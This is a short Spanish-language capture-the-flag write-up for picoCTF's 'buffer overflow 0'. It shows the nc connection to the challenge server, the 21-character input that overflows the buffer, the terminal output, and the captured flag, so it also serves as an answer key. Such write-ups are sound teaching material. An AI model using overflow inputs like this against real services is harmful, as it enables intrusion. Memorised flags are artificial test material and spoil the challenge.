# buffer overflow 0

## Objetivo.

Smash the stackLet's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/173/vuln). You can view source [here](https://artifacts.picoctf.net/c/173/vuln.c). And connect with it using:`nc saturn.picoctf.net 51532`

## Solución.

**Conectarse a nc saturn.picoctf.net 51532** 

**En input meter 21 , 1's**

```
frausto_san-picoctf@webshell:~/picoctf/binaryexplotation$ nc saturn.picoctf.net 51532
Input: 111111111111111111111
picoCTF{ov3rfl0ws_ar3nt_that_bad_90d2bb58}
```

**Bandera** picoCTF{ov3rfl0ws_ar3nt_that_bad_90d2bb58}

## Notas opcionales.

## Referencias.

Vídeo

https://www.youtube.com/watch?v=4EBqN0X8kEw&ab_channel=number0x01